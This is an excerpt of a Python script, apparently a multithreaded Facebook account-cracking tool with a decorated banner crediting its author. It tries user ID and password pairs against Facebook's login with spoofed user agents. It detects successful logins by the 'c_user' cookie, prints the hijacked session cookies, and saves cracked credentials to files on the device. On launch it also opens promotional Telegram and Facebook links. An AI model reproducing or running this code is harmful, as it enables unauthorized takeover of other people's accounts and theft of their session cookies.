...
for ua in range(10000):
	...
	ugen.append(alhhaj)
os.system("xdg-open https://t.me/+3cfBwIKipV8zMDFl")
...
\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mHTB\033[1;39m━━━━━━━━━━━━━━━━━━━━━┓
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m       : [★] ZEXX\033[1;39m       ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] Farhan Mallik\033[1;39m   ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★] farhanmallik51\033[1;39m        ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★]+8801633579132\033[1;39m     ┃
...
def Jaber():
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/404493934647110/')
    print(logo)
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
    ...
    if Jaber in ["2","B"]:
        os.system('xdg-open https://facebook.com/groups/404493934647110/')
    if Jaber in ["3","C"]:
        os.system('xdg-open https://www.facebook.com/profile.php?id=100001640613637')
    if Jaber in ["0","X"]:
        os.system('exit')
...
def Jabers():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m MAKE BY Farhan ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
    ...
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM FARHAN ')
    print("\033[1;91m╚═══════════════════════════╝")
...
def Jaberm(uid,pwx,tl):
    ...
    # 'cookie': 'datr=kEdCZi7bE7TYC_qrspXfdA4W; sb=kEdCZod1YyHGYOUGtF9iBZ-D; m_pixel_ratio=2; wd=360x675; fr=02uCa7ZteULC9V2f3..BmQkeQ..AAA.0.0.BmQkeU.AWVF-X1tY-c',
    'dpr': '2',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mFARHAN-OK\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                open('/sdcard/paid-1-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[FARHAN-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/paid-1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
